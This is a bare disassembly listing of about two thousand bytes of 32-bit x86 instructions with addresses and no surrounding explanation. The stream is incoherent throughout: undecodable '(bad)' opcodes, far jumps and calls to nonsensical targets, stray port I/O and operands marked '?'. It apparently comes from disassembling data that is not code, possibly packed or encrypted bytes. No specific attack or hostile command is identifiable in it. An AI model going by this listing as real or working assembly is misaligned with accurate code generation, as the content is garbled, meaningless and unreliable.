  415d78:	loope  0x415d13
  415d7a:	std    
  415d7b:	pop    ss
  415d7c:	sbb    al,0x11
  415d7e:	rcr    BYTE PTR [ebx-0x40],0xf5
  415d82:	xor    eax,0x6d9b521f
  415d87:	sbb    DWORD PTR [eax+0x99ca623],0xffffffac
  415d8e:	imul   ebp,edi,0x8
  415d91:	and    BYTE PTR [edx],bh
  415d93:	fiadd  WORD PTR [ecx]
  415d95:	repz aas 
  415d97:	sub    dh,BYTE PTR [eax+eiz*2]
  415d9a:	aas    
  415d9b:	int    0xab
  415d9d:	jo     0x415de1
  415d9f:	aam    0x2d
  415da1:	fistp  QWORD PTR [edi+0x1e]
  415da4:	xor    ebp,DWORD PTR [esi-0x2c19bce]
  415daa:	inc    ebx
  415dab:	out    dx,al
  415dac:	mul    DWORD PTR [eax-0x19]
  415daf:	dec    ebx
  415db0:	and    BYTE PTR [ebp+0x209de793],dl
  415db6:	mov    ecx,0xab5624bc
  415dbb:	jmp    0xd7a5:0xb9754a47
  415dc2:	jmp    0xde22523a
  415dc7:	jmp    0x8216ed48
  415dcc:	add    edi,DWORD PTR [ebp-0x2f]
  415dcf:	jl     0x415e01
  415dd1:	repz cmp esi,DWORD PTR [esi]
  415dd4:	jmp    0x415d79
  415dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dd7:	add    DWORD PTR [esi],ecx
  415dd9:	mov    ecx,0x5e392be8
  415dde:	jo     0x415dc9
  415de0:	popa   
  415de1:	jge    0x415d9f
  415de3:	sub    DWORD PTR [ebp-0x1b08df67],0xffffffe5
  415dea:	ja     0x415daf
  415dec:	pop    ecx
  415ded:	call   0x468c:0xe51ed57
  415df4:	jecxz  0x415db7
  415df6:	jl     0x415dbf
  415df8:	jp     0x415e54
  415dfa:	mov    WORD PTR [eax-0x283298b0],?
  415e00:	out    0x64,al
  415e02:	ins    BYTE PTR es:[edi],dx
  415e03:	jl     0x415e0b
  415e05:	dec    esp
  415e06:	sbb    esi,edi
  415e08:	inc    eax
  415e09:	fsub   st,st(6)
  415e0b:	pop    ecx
  415e0c:	out    0xb5,eax
  415e0e:	enter  0x7bd7,0x6e
  415e12:	mov    edx,0x8bac1e78
  415e17:	sahf   
  415e18:	loope  0x415daa
  415e1a:	mov    esi,0x14cef3d2
  415e1f:	fcmovne st,st(7)
  415e21:	xor    DWORD PTR [ebp+0x23],ebx
  415e24:	jp     0x415dfd
  415e26:	pop    es
  415e27:	and    al,0xa5
  415e29:	ss inc ecx
  415e2b:	outs   dx,DWORD PTR ds:[esi]
  415e2c:	inc    ecx
  415e2d:	push   0xb
  415e2f:	data16 lahf 
  415e31:	xor    DWORD PTR [edx+0x22],edi
  415e34:	ret    
  415e35:	xchg   esp,eax
  415e36:	jmp    0xc0291853
  415e3b:	sahf   
  415e3c:	div    DWORD PTR [esi-0x27]
  415e3f:	mov    al,0x5f
  415e41:	das    
  415e42:	sub    cl,BYTE PTR [esi+0x24bba898]
  415e48:	outs   dx,BYTE PTR ds:[esi]
  415e49:	mov    ebx,0x6a7c621a
  415e4e:	aam    0xa2
  415e50:	jae    0x415e39
  415e52:	mov    WORD PTR ds:0x84458255,?
  415e58:	(bad)  
  415e59:	sti    
  415e5a:	mov    cl,0x60
  415e5c:	xchg   DWORD PTR [ecx+0xc],ebp
  415e5f:	outs   dx,DWORD PTR ds:[esi]
  415e60:	test   DWORD PTR [eax+edx*8-0x63ec57d3],edx
  415e67:	jne    0x415e3e
  415e69:	js     0x415e7c
  415e6b:	jecxz  0x415e8e
  415e6d:	pop    ebx
  415e6e:	imul   esp,DWORD PTR [esi],0x7cc4bf76
  415e74:	jmp    0xbd06:0xf9de0d01
  415e7b:	int3   
  415e7c:	mov    bl,0x46
  415e7e:	push   eax
  415e7f:	(bad)  
  415e80:	stos   BYTE PTR es:[edi],al
  415e81:	(bad)  
  415e82:	push   esp
  415e83:	jecxz  0x415edb
  415e85:	inc    ebp
  415e86:	adc    edx,DWORD PTR [eax+0x7919405d]
  415e8c:	das    
  415e8d:	adc    bh,ah
  415e8f:	fwait
  415e90:	and    edx,DWORD PTR [ecx+0x4599c22c]
  415e96:	sbb    edx,esp
  415e98:	call   0x7131:0x30f5582b
  415e9f:	test   DWORD PTR [ebx+0x56],esi
  415ea2:	xor    ecx,ecx
  415ea4:	data16 data16 xlat BYTE PTR ds:[ebx]
  415ea7:	or     al,0x8f
  415ea9:	sub    eax,0xe08d60a1
  415eae:	add    DWORD PTR [ecx-0x65],0x20
  415eb2:	shr    eax,cl
  415eb4:	push   0x2fb924f0
  415eb9:	fld    QWORD PTR [edx]
  415ebb:	dec    ecx
  415ebc:	pop    esp
  415ebd:	add    DWORD PTR [ebx+0x48b9b81f],esi
  415ec3:	retf   
  415ec4:	adc    BYTE PTR [eax+0x17dbd199],bl
  415eca:	jb     0x415ea1
  415ecc:	mov    ebp,0xe09f45d9
  415ed1:	inc    esi
  415ed2:	lar    edx,WORD PTR [edx-0x63]
  415ed6:	push   edx
  415ed7:	add    DWORD PTR [ecx+ebx*8-0x32f20ec5],esp
  415ede:	mov    eax,ds:0xc0a2a78d
  415ee3:	mov    ds:0x8aa7d344,al
  415ee8:	mov    ebx,0x27a801fd
  415eed:	fs cwde 
  415eef:	lods   al,BYTE PTR ds:[esi]
  415ef0:	xor    ah,BYTE PTR [esi]
  415ef2:	outs   dx,BYTE PTR ds:[esi]
  415ef3:	lea    edi,[eax+edi*2+0x48c31836]
  415efa:	mov    eax,ds:0xf2ebbfed
  415eff:	jns    0x415f58
  415f01:	ja     0x415edb
  415f03:	ins    BYTE PTR es:[edi],dx
  415f04:	pop    ebp
  415f05:	(bad)  
  415f06:	int    0x1d
  415f08:	clc    
  415f09:	in     eax,0x50
  415f0b:	push   eax
  415f0c:	leave  
  415f0d:	aaa    
  415f0e:	and    BYTE PTR [eax],bl
  415f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f11:	int3   
  415f12:	inc    ecx
  415f13:	dec    ecx
  415f14:	scas   al,BYTE PTR es:[edi]
  415f15:	xlat   BYTE PTR ds:[ebx]
  415f16:	ins    BYTE PTR es:[edi],dx
  415f17:	into   
  415f18:	into   
  415f19:	(bad)  
  415f1a:	lods   al,BYTE PTR ds:[esi]
  415f1b:	add    al,0x3b
  415f1d:	jmp    0xb65e2b66
  415f22:	imul   esi,DWORD PTR [edi-0x4bb942b0],0x594e5a6a
  415f2c:	cmp    al,dh
  415f2e:	sbb    DWORD PTR [ecx+0x20],eax
  415f31:	js     0x415fa4
  415f33:	je     0x415ec6
  415f35:	mov    ebp,0x6250a82a
  415f3a:	int    0xeb
  415f3c:	and    eax,0x460b3fba
  415f41:	fldcw  WORD PTR [eax-0x2f]
  415f44:	xchg   ecx,eax
  415f45:	loop   0x415f94
  415f47:	cmp    BYTE PTR [edi+0x5fa6cc89],bh
  415f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f4e:	sti    
  415f4f:	inc    esi
  415f50:	push   ebx
  415f51:	in     eax,0x7a
  415f53:	in     al,dx
  415f54:	retf   0xd6ce
  415f57:	xor    ah,BYTE PTR [edx+0x41f768dd]
  415f5d:	mov    esi,0xe4334001
  415f62:	test   DWORD PTR [ebx+eiz*1],0x501158a8
  415f69:	call   0x84:0x18c073e9
  415f70:	add    ah,0xaf
  415f73:	push   cs
  415f74:	sbb    ecx,ebx
  415f76:	(bad)  
  415f77:	(bad)  
  415f78:	dec    esi
  415f79:	pop    edi
  415f7a:	xchg   ebp,ebx
  415f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7d:	repnz aad 0x32
  415f80:	jmp    0xb3b9:0x1be74f39
  415f87:	sbb    BYTE PTR [edx+ecx*1-0x46],al
  415f8b:	inc    ecx
  415f8c:	cmp    eax,0xf9dabfee
  415f91:	aaa    
  415f92:	add    ecx,DWORD PTR [ecx+ebp*2-0x2a26c9ab]
  415f99:	mov    edi,0x74dc3ef8
  415f9e:	leave  
  415f9f:	push   cs
  415fa0:	ins    BYTE PTR es:[edi],dx
  415fa1:	ins    DWORD PTR es:[edi],dx
  415fa2:	xchg   esi,eax
  415fa3:	xor    edx,ebp
  415fa5:	jb     0x415f57
  415fa7:	out    dx,al
  415fa8:	out    0x32,eax
  415faa:	push   ss
  415fab:	pop    ss
  415fac:	pusha  
  415fad:	push   edx
  415fae:	popf   
  415faf:	fisub  WORD PTR [ebx+0x41dbb87c]
  415fb5:	cs dec ebx
  415fb7:	mov    ch,0x25
  415fb9:	loope  0x415fd6
  415fbb:	mov    ah,0xaf
  415fbd:	push   es
  415fbe:	mov    ss,WORD PTR [edi+eiz*4-0xd7d4bf9]
  415fc5:	pusha  
  415fc6:	dec    esi
  415fc7:	xor    ebx,DWORD PTR [edi]
  415fc9:	nop
  415fca:	push   ss
  415fcb:	adc    cl,BYTE PTR [eax+esi*4+0x5033a458]
  415fd2:	jb     0x415f66
  415fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fd5:	(bad)  
  415fd6:	pop    esp
  415fd7:	jbe    0x415fb8
  415fd9:	push   esi
  415fda:	sub    dl,BYTE PTR [ebx+esi*4-0x78]
  415fde:	enter  0x8295,0x76
  415fe2:	lahf   
  415fe3:	bound  eax,QWORD PTR ds:0x128b5873
  415fe9:	lds    esi,FWORD PTR [eax+0x35468cb2]
  415fef:	repnz fiadd DWORD PTR [edx+0x26]
  415ff3:	sub    ebx,DWORD PTR [eax+eiz*2]
  415ff6:	xor    eax,esp
  415ff8:	jno    0x416068
  415ffa:	inc    edx
  415ffb:	call   0x93fc:0x48d8c15a
  416002:	iret   
  416003:	dec    esi
  416004:	and    DWORD PTR [edi+0x4df8f095],edx
  41600a:	rol    BYTE PTR ds:0xc3d3f5cf,cl
  416010:	fmul   st,st(0)
  416012:	cmp    DWORD PTR [ebx-0x590c9793],edi
  416018:	jae    0x415fc4
  41601a:	fidivr DWORD PTR [esp+edx*8+0x4c39f3a3]
  416021:	das    
  416022:	fs das 
  416024:	hlt    
  416025:	pop    ds
  416026:	bnd jmp 0x1ea33992
  41602c:	mov    ah,0xd1
  41602e:	sbb    eax,0x3db4b03
  416033:	(bad)  
  416034:	mov    dh,0x4a
  416036:	inc    esp
  416037:	jge    0x416006
  416039:	(bad)  [eax+0x67]
  41603c:	shl    DWORD PTR [eax],cl
  41603e:	enter  0x43f5,0x99
  416042:	and    ch,ch
  416044:	adc    BYTE PTR [edi+0x30],al
  416047:	addr16 jmp 0x584:0xedf9f8d0
  41604f:	jle    0x4160bb
  416051:	aas    
  416052:	mov    dl,0x45
  416054:	push   cs
  416055:	cli    
  416056:	mov    bh,0x8e
  416058:	aad    0xd3
  41605a:	dec    DWORD PTR [esp-0x48]
  41605e:	mov    dl,0x29
  416060:	pop    ss
  416061:	fcom   DWORD PTR [ecx+0x625f5ec6]
  416067:	or     al,0x38
  416069:	mov    eax,ds:0xa906e822
  41606e:	mov    eax,ds:0x1558b31b
  416073:	out    dx,eax
  416074:	add    cl,BYTE PTR [ecx-0x77]
  416077:	xchg   ecx,eax
  416078:	out    0xd7,eax
  41607a:	std    
  41607b:	scas   al,BYTE PTR es:[edi]
  41607c:	lods   al,BYTE PTR ds:[esi]
  41607d:	cwde   
  41607e:	mov    eax,gs
  416080:	add    al,0x28
  416082:	jo     0x416099
  416084:	or     BYTE PTR [eax-0x5463135b],al
  41608a:	pop    eax
  41608b:	gs loope 0x416074
  41608e:	add    al,0x5f
  416090:	std    
  416091:	mov    edx,0x1d9f2859
  416096:	mov    ss,WORD PTR [edi]
  416098:	xor    ebx,DWORD PTR ds:0x916288ce
  41609e:	push   cs
  41609f:	stc    
  4160a0:	std    
  4160a1:	mov    al,ds:0xd26b18c3
  4160a6:	xlat   BYTE PTR ds:[ebx]
  4160a7:	aam    0xab
  4160a9:	jmp    0x3290:0x52af5282
  4160b0:	inc    ebx
  4160b1:	fcom   st(7)
  4160b3:	into   
  4160b4:	test   eax,0x25f30ba2
  4160b9:	inc    eax
  4160ba:	and    BYTE PTR [edi+0x5c3816e1],bl
  4160c0:	dec    edx
  4160c1:	mov    esi,0xd166ee6c
  4160c6:	xor    eax,0xdaffc2e1
  4160cb:	pop    esi
  4160cc:	inc    esp
  4160cd:	dec    ebx
  4160ce:	sar    DWORD PTR [edx-0x525238aa],1
  4160d4:	neg    BYTE PTR [edx-0x3f]
  4160d7:	mov    dl,0xc0
  4160d9:	sub    DWORD PTR [ecx+0x16],ebp
  4160dc:	sbb    BYTE PTR [edx-0x4c],0x2b
  4160e0:	or     esp,DWORD PTR [ecx-0x297b8205]
  4160e6:	mul    esp
  4160e8:	mov    edx,0x6df1d08f
  4160ed:	outs   dx,BYTE PTR ds:[esi]
  4160ee:	sbb    BYTE PTR [esi-0x22],0xfe
  4160f2:	jb     0x81ddc944
  4160f8:	cmp    DWORD PTR [ebx],eax
  4160fa:	mov    cl,0x77
  4160fc:	sub    eax,0xf7580d8a
  416101:	pop    ss
  416102:	cmp    dh,BYTE PTR [ecx-0x1ac85819]
  416108:	mov    WORD PTR [eax-0x1b],cs
  41610b:	xchg   edi,eax
  41610c:	out    dx,al
  41610d:	sbb    al,0x35
  41610f:	jge    0x416132
  416111:	mov    ebp,0xbf9c6bd8
  416116:	dec    esi
  416117:	mov    dl,0xb0
  416119:	in     eax,dx
  41611a:	xor    ebx,DWORD PTR [edi-0x79]
  41611d:	xchg   edx,eax
  41611e:	sbb    eax,0x7aa98f67
  416123:	mov    edi,DWORD PTR [ebx-0x1dd8e250]
  416129:	sub    edx,DWORD PTR [esi+0x48cbc350]
  41612f:	inc    ebp
  416130:	dec    ebx
  416131:	lods   al,BYTE PTR ds:[esi]
  416132:	fmulp  st(5),st
  416134:	loopne 0x4160c3
  416136:	mov    esp,0x9af149d3
  41613b:	add    eax,0x1916ca50
  416140:	aad    0x12
  416142:	aad    0x59
  416144:	or     ebx,DWORD PTR [esi+0xe]
  416147:	mov    ebx,0x32c1a014
  41614c:	cmp    BYTE PTR [edi],dl
  41614e:	test   ecx,edx
  416150:	test   eax,0x1e74c6fc
  416155:	(bad)  
  416156:	push   DWORD PTR [esi]
  416158:	test   eax,0x2fc4bd9a
  41615d:	inc    esi
  41615e:	call   0xa4fdbbe3
  416163:	sbb    DWORD PTR [ecx-0x2c],0xffffffa1
  416167:	pop    esp
  416168:	daa    
  416169:	repz jb 0x416137
  41616c:	push   ds
  41616d:	sub    esp,DWORD PTR [esi+ebx*2]
  416170:	push   ebp
  416171:	hlt    
  416172:	mov    eax,0x9981ab6f
  416177:	cmp    DWORD PTR [edx+0x66a48ca7],ebx
  41617d:	pop    ebp
  41617e:	repz mov esi,0x19ecf8f5
  416184:	outs   dx,BYTE PTR ds:[esi]
  416185:	add    BYTE PTR [esi-0x66],bh
  416188:	xor    ebp,ecx
  41618a:	pop    esi
  41618b:	xor    al,0xf5
  41618d:	enter  0xf529,0xbb
  416191:	rcr    BYTE PTR [edx+0x33d8891],0xd4
  416198:	repnz xchg esp,eax
  41619a:	xor    al,0x0
  41619c:	jne    0x4161be
  41619e:	fist   WORD PTR [esi-0x3b]
  4161a1:	int    0x72
  4161a3:	loopne 0x41620c
  4161a5:	mov    ds:0x802fbeeb,al
  4161aa:	jl     0x4161a1
  4161ac:	stos   BYTE PTR es:[edi],al
  4161ad:	mov    esi,0xf3db4b5b
  4161b2:	xchg   esi,eax
  4161b3:	mul    eax
  4161b5:	lods   al,BYTE PTR ds:[esi]
  4161b6:	ds ret 
  4161b8:	lds    esp,FWORD PTR [ecx]
  4161ba:	inc    ecx
  4161bb:	dec    eax
  4161bc:	jne    0x4161c2
  4161be:	mov    ecx,0x3a893553
  4161c3:	fwait
  4161c4:	cmp    eax,0xbdffa55b
  4161c9:	mov    BYTE PTR [ecx+0x4a],cl
  4161cc:	sbb    al,BYTE PTR [ebx+0x7f]
  4161cf:	xor    cl,BYTE PTR [ebx+0x55]
  4161d2:	jl     0x41620b
  4161d4:	into   
  4161d5:	std    
  4161d6:	jge    0x416160
  4161d8:	mov    bl,0x60
  4161da:	cmp    BYTE PTR [ecx],ah
  4161dc:	pop    edx
  4161dd:	enter  0x6e0,0xe6
  4161e1:	pop    ebx
  4161e2:	mov    edx,0xd923367f
  4161e7:	cwde   
  4161e8:	and    eax,DWORD PTR [edx-0x1]
  4161eb:	inc    ebp
  4161ec:	rcl    DWORD PTR [ebx+esi*2+0x5c],cl
  4161f0:	jle    0x41622d
  4161f2:	lock ins BYTE PTR es:[edi],dx
  4161f4:	mov    ds,edx
  4161f6:	aaa    
  4161f7:	scas   eax,DWORD PTR es:[edi]
  4161f8:	cmp    DWORD PTR [ebx-0x4e],edi
  4161fb:	jne    0x4161ed
  4161fd:	loopne 0x41624f
  4161ff:	ret    0x8593
  416202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416203:	ja     0x416253
  416205:	fst    DWORD PTR [edx-0xd7ff3d9]
  41620b:	shl    BYTE PTR [edi+0x27],1
  41620e:	out    0x5d,al
  416210:	xchg   edx,eax
  416211:	scas   eax,DWORD PTR es:[edi]
  416212:	fistp  QWORD PTR [edi]
  416214:	sar    BYTE PTR [ecx-0x18],1
  416217:	stos   DWORD PTR es:[edi],eax
  416218:	pop    esi
  416219:	test   eax,0x6fee01bb
  41621e:	mov    DWORD PTR [ecx+0x527cd51c],edi
  416224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416225:	xchg   esp,eax
  416226:	sbb    edx,DWORD PTR [ebp+0x48]
  416229:	push   eax
  41622a:	ror    eax,1
  41622c:	retf   
  41622d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41622e:	and    eax,0xe23b63b3
  416233:	mov    ds:0x5d267c59,al
  416238:	mov    al,ds:0xfaee4d57
  41623d:	jg     0x41622e
  41623f:	xlat   BYTE PTR ds:[ebx]
  416240:	(bad)  
  416241:	les    edx,FWORD PTR gs:[ebx+0x776e5a33]
  416248:	retf   0x24c2
  41624b:	inc    edi
  41624c:	and    BYTE PTR [esi],ch
  41624e:	jne    0x4161d5
  416250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416251:	test   BYTE PTR [ebx-0x23],bh
  416254:	mov    BYTE PTR [eax+0x63],al
  416257:	pop    edx
  416258:	jg     0x4162b5
  41625a:	push   es
  41625b:	aaa    
  41625c:	loop   0x416270
  41625e:	sbb    BYTE PTR [eax-0x3f494641],0x24
  416265:	jbe    0x416276
  416267:	dec    edi
  416268:	shr    BYTE PTR [esi-0x5c],cl
  41626b:	and    DWORD PTR [edi-0x19],ecx
  41626e:	inc    ebp
  41626f:	push   edi
  416270:	jmp    0xaad63a42
  416275:	add    BYTE PTR [ebx],bh
  416277:	add    ecx,DWORD PTR [ecx-0x64]
  41627a:	pusha  
  41627b:	cdq    
  41627c:	jmp    0xa348aa7a
  416281:	push   ds
  416282:	popa   
  416283:	je     0x4162c4
  416285:	pop    edi
  416286:	ins    DWORD PTR es:[edi],dx
  416287:	jle    0x416290
  416289:	inc    eax
  41628a:	daa    
  41628b:	imul   edi,DWORD PTR [eax+eax*1],0xd9acd544
  416292:	xchg   ebp,eax
  416293:	enter  0xa2b9,0x51
  416297:	and    ch,dh
  416299:	inc    ebp
  41629a:	sub    DWORD PTR [ebx-0x76],ecx
  41629d:	jb     0x4162cf
  41629f:	test   DWORD PTR [ecx+0x2],edx
  4162a2:	inc    ecx
  4162a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162a4:	xchg   ecx,eax
  4162a5:	das    
  4162a6:	test   dh,bl
  4162a8:	push   0xf7c41d6b
  4162ad:	pop    ds
  4162ae:	in     eax,dx
  4162af:	mov    bl,0x77
  4162b1:	shl    al,1
  4162b3:	inc    ebx
  4162b4:	push   eax
  4162b5:	in     al,0x12
  4162b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b8:	outs   dx,DWORD PTR ds:[esi]
  4162b9:	push   ss
  4162ba:	xchg   BYTE PTR [edx+0x6161246a],dh
  4162c0:	sti    
  4162c1:	xor    al,0xe0
  4162c3:	ss hlt 
  4162c5:	repnz push esi
  4162c7:	jge    0x416333
  4162c9:	pop    esi
  4162ca:	out    0xaf,al
  4162cc:	mov    ecx,0x39077b03
  4162d1:	add    esi,DWORD PTR [ecx]
  4162d3:	shr    edi,1
  4162d5:	(bad)  
  4162d6:	fmul   QWORD PTR [edi+0x57]
  4162d9:	rol    DWORD PTR [di-0x409a],0x2d
  4162df:	lods   al,BYTE PTR ds:[esi]
  4162e0:	out    dx,eax
  4162e1:	pop    ds
  4162e2:	aad    0x59
  4162e4:	xor    al,0xfa
  4162e6:	or     ch,bl
  4162e8:	jecxz  0x416302
  4162ea:	clc    
  4162eb:	or     eax,0x9e66292c
  4162f0:	icebp  
  4162f1:	jbe    0x416359
  4162f3:	add    BYTE PTR [ebx],cl
  4162f5:	mov    esi,esi
  4162f7:	scas   al,BYTE PTR es:[edi]
  4162f8:	mov    fs,WORD PTR [ebx+eiz*4+0x6b]
  4162fc:	pmulhuw mm5,QWORD PTR [ebx]
  4162ff:	or     esp,DWORD PTR [ebp-0xb81d7d1]
  416305:	iret   
  416306:	inc    ebp
  416307:	cmp    ebp,esi
  416309:	xor    BYTE PTR [eax-0x51],0xb5
  41630d:	pop    ebx
  41630e:	push   ds
  41630f:	daa    
  416310:	adc    eax,DWORD PTR [eax+0x11]
  416313:	and    edi,DWORD PTR [ebp+0x17]
  416316:	cwde   
  416317:	pusha  
  416318:	cmp    BYTE PTR [eax],ah
  41631a:	pop    ebp
  41631b:	cmp    ah,BYTE PTR [edi+ebx*2-0x19]
  41631f:	add    eax,0xd7b5bd1c
  416324:	xchg   ebx,eax
  416325:	jno    0x416304
  416327:	mov    bh,0x82
  416329:	push   ebp
  41632a:	ins    DWORD PTR es:[edi],dx
  41632b:	adc    BYTE PTR [eax+esi*8+0xf7b0663],bh
  416332:	cli    
  416333:	xlat   BYTE PTR ds:[ebx]
  416334:	psubsw mm1,QWORD PTR [edi+0x4a]
  416338:	mov    ds:0xf6bc8ba3,eax
  41633d:	push   esi
  41633e:	and    eax,0x743508e4
  416343:	jae    0x4163b3
  416345:	add    DWORD PTR [esi+edi*1-0x73dfea43],ebp
  41634c:	hlt    
  41634d:	mov    ah,0x1f
  41634f:	and    eax,0xe91ff39a
  416354:	sub    ebx,eax
  416356:	cmp    ah,BYTE PTR [edx+0x62]
  416359:	and    ch,BYTE PTR [esi]
  41635b:	add    eax,0x6c6219f0
  416360:	pushf  
  416361:	inc    eax
  416362:	lds    esi,FWORD PTR [ebp+ebx*4-0x12]
  416366:	push   edi
  416367:	and    ch,BYTE PTR [ebx+0x7d]
  41636a:	dec    edi
  41636b:	mov    dh,0x6a
  41636d:	lods   eax,DWORD PTR ds:[esi]
  41636e:	xchg   edi,eax
  41636f:	ins    DWORD PTR es:[edi],dx
  416370:	or     bh,BYTE PTR [ecx]
  416372:	mov    cl,0x5
  416374:	jmp    0x416366
  416376:	(bad)  
  416377:	mov    esi,0x89f8dcc3
  41637c:	mov    eax,ds:0xd794016d
  416381:	mov    cl,0x75
  416383:	scas   eax,DWORD PTR es:[edi]
  416384:	dec    ecx
  416385:	mov    eax,ds:0xdfede09f
  41638a:	stc    
  41638b:	mov    DWORD PTR [ebx],esi
  41638d:	mov    al,0x72
  41638f:	mov    cl,BYTE PTR [ebx-0x2a]
  416392:	sub    eax,DWORD PTR [ecx+esi*8-0x77]
  416396:	pop    eax
  416397:	push   ds
  416398:	dec    edx
  416399:	mov    bh,0x28
  41639b:	cmp    bl,ch
  41639d:	int3   
  41639e:	mov    ?,esp
  4163a0:	fdiv   QWORD PTR [edi+0x44]
  4163a3:	mov    ebp,0x4c0e3c47
  4163a8:	push   cs
  4163a9:	xchg   DWORD PTR [esi+0xfe00f73],edx
  4163af:	mov    ecx,0x983f818e
  4163b4:	jae    0x4163f0
  4163b6:	or     BYTE PTR [ebx-0x280d78bc],bh
  4163bc:	sbb    BYTE PTR [esi+0x4842d7f8],dh
  4163c2:	(bad)  
  4163c3:	sub    DWORD PTR [edx-0x58df0f81],ebx
  4163c9:	mulps  xmm6,XMMWORD PTR [eax-0x12]
  4163cd:	cli    
  4163ce:	mov    al,0x63
  4163d0:	and    bl,bl
  4163d2:	xor    ch,al
  4163d4:	xchg   edi,eax
  4163d5:	xchg   edi,eax
  4163d6:	clc    
  4163d7:	cmp    edx,esp
  4163d9:	call   0x6a5feaa
  4163de:	pushf  
  4163df:	push   esi
  4163e0:	xor    BYTE PTR [eax],bl
  4163e2:	mov    bh,0x2f
  4163e4:	xor    BYTE PTR [ebp+0x22450fa3],0x23
  4163eb:	pop    ebp
  4163ec:	sub    al,0x3
  4163ee:	jne    0x416440
  4163f0:	jmp    0x416455
  4163f2:	cli    
  4163f3:	mov    ch,0x67
  4163f5:	sbb    bh,al
  4163f7:	dec    ebx
  4163f8:	out    dx,eax
  4163f9:	or     DWORD PTR [ebx],0x60
  4163fc:	test   eax,0x92e7cb89
  416401:	je     0x41642a
  416403:	xor    cl,BYTE PTR [edx-0x4a]
  416406:	push   0x994c587c
  41640b:	inc    edx
  41640c:	ror    DWORD PTR [ecx+eiz*2+0x7c283caf],1
  416413:	in     al,0xe8
  416415:	adc    DWORD PTR [ebp+0x4c017332],edi
  41641b:	push   ebp
  41641c:	and    al,0x90
  41641e:	int    0x76
  416420:	call   FWORD PTR [ebx]
  416422:	xor    DWORD PTR [esp+edx*2-0x1869d2d7],edx
  416429:	(bad)  
  41642a:	pop    ecx
  41642b:	xchg   ebp,eax
  41642c:	and    al,0x99
  41642e:	popa   
  41642f:	jno    0x416499
  416431:	mov    ?,WORD PTR [edx-0x62]
  416434:	mov    ch,0x3f
  416436:	push   es
  416437:	mov    cl,0xa2
  416439:	addr16 push ebx
  41643b:	or     DWORD PTR [ecx-0x349e4091],edx
  416441:	mov    eax,ds:0xd54e6808
  416446:	scas   al,BYTE PTR es:[edi]
  416447:	mov    bl,BYTE PTR ds:0x918ffbdf
  41644d:	repz mov edx,0x9dbc9364
  416453:	rol    bh,0x43
  416456:	push   ecx
  416457:	pop    ecx
  416458:	mov    eax,0xdf05c754
  41645d:	cmp    eax,0xd9854393
  416462:	test   bh,bh
  416464:	aam    0x52
  416466:	add    eax,0xa13f2451
  41646b:	mov    bl,0x42
  41646d:	cli    
  41646e:	and    BYTE PTR [edi+0x137d27be],dl
  416474:	ret    0x79ad
  416477:	mov    dh,0x81
  416479:	cmp    DWORD PTR [eax+0x70],eax
  41647c:	jp     0x4164f1
  41647e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41647f:	into   
  416480:	sbb    DWORD PTR [ebx+0x44],edx
  416483:	in     eax,0x37
  416485:	hlt    
  416486:	mov    esi,0x81c689d7
  41648b:	push   cs
  41648c:	pop    eax
  41648d:	aaa    
  41648e:	inc    eax
  41648f:	outs   dx,DWORD PTR ds:[esi]
  416490:	add    BYTE PTR [edi+0x63],cl
  416493:	cmp    al,0x44
  416495:	shr    DWORD PTR [edi-0x61],0x4e
  416499:	sbb    ebx,DWORD PTR [esi]
  41649b:	ror    BYTE PTR ds:0x552be3f9,0x70
  4164a2:	or     dh,cl
  4164a4:	jns    0x416487
  4164a6:	fistp  DWORD PTR [eax+0x79]
  4164a9:	in     eax,0x1
  4164ab:	les    esi,FWORD PTR [edx]
  4164ad:	mov    DWORD PTR [ebx+0x20bf2afa],ebx
  4164b3:	xchg   edi,eax
  4164b4:	pop    esp
  4164b5:	call   0x4013a7fc
  4164ba:	jnp    0x416531
  4164bc:	mov    ss:0xbfa5d875,eax
  4164c2:	inc    eax
  4164c3:	mov    dl,0xeb
  4164c5:	push   ecx
  4164c6:	shl    BYTE PTR [edi-0x1031f30c],1
  4164cc:	mov    ds,WORD PTR [ecx]
  4164ce:	add    al,0xf2
  4164d0:	icebp  
  4164d1:	mov    ecx,0x641818c6
  4164d6:	popa   
  4164d7:	mov    eax,0xb9ef2302
  4164dc:	push   ebp
  4164dd:	push   ss
  4164de:	add    BYTE PTR ds:0x1f254d21,bh
  4164e4:	xchg   ebx,eax
  4164e5:	sub    BYTE PTR [ebp-0x58795cc0],bh
  4164eb:	adc    al,0x90
  4164ed:	inc    edi
  4164ee:	inc    ecx
  4164ef:	xchg   edx,eax
  4164f0:	adc    al,0x8f
  4164f2:	pop    ss
  4164f3:	mov    BYTE PTR [edi],dh
  4164f5:	add    esi,ecx
  4164f7:	dec    DWORD PTR [ebx]
  4164f9:	jae    0x41650b
  4164fb:	xchg   edi,eax
  4164fc:	pop    edi
  4164fd:	ror    BYTE PTR [eax],0x38
  416500:	add    eax,0xb8c6304
  416505:	sub    eax,0xc32c0a50
  41650a:	leave  
  41650b:	sub    eax,0x8e1403ab
  416510:	data16 scas al,BYTE PTR es:[edi]
  416512:	loope  0x41655f
  416514:	push   ss
  416515:	adc    eax,0x5f8c88eb
  41651a:	cmp    BYTE PTR [ecx+0x6c],bl
  41651d:	addr16 or al,0x7c
  416521:	or     dl,BYTE PTR [ecx+0x4]
  416524:	aam    0x33
  416526:	push   cs
  416527:	sbb    eax,0x7c3570aa
  41652c:	jmp    0x41657e
  41652e:	push   ecx
  41652f:	bound  edi,QWORD PTR [edi+esi*8-0xc3b40d7]
  416536:	out    0xbe,eax
  416538:	mov    cl,0x46
  41653a:	push   eax
  41653b:	pop    edx
  41653c:	xor    al,0x95
  41653e:	int3   
  41653f:	loopne 0x4165a0
  416541:	pminub mm7,mm4
  416544:	aaa    
  416545:	nop
  416546:	pop    eax
  416547:	loope  0x41657a
  416549:	psubw  mm6,QWORD PTR [ecx]
  41654c:	push   ebx
  41654d:	jp     0x4164d9
